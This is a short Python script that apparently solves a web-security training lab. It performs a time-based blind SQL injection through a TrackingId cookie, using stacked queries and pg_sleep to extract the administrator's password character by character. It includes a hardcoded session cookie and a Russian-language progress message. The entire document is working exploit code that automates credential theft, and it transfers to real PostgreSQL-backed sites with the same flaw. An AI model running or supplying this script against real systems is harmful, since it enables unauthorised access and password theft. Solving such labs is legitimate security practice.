import requests 
import string

url = 'https://0a4c00fc0449c62e8070f3f5002800c3.web-security-academy.net'
cookie = {
    "TrackingId": "6Lr9NW4IYRav5L91",
    "session": "QL3Wgp3obCT2aCa2fSYHhOaH7UfZ9Rn3"
}

allstring = string.ascii_lowercase + string.digits

track_id = cookie["TrackingId"]

client = requests.Session()
paswrd = ""
response = client.get(url,cookies=cookie, timeout=10)
print(response.status_code)
for num in range(1,21):
    for a in allstring:
       payload= (
            f"{track_id}'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{num},1)='{a}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"
       )
       cookie = {
           "TrackingId": payload,
           "session": "QL3Wgp3obCT2aCa2fSYHhOaH7UfZ9Rn3"
           }
       response = client.get(url, cookies=cookie,timeout=20)
       if response.elapsed.total_seconds() >= 9:
           paswrd += a
           print(f'найдет символ: {a}')
           break
print(paswrd)
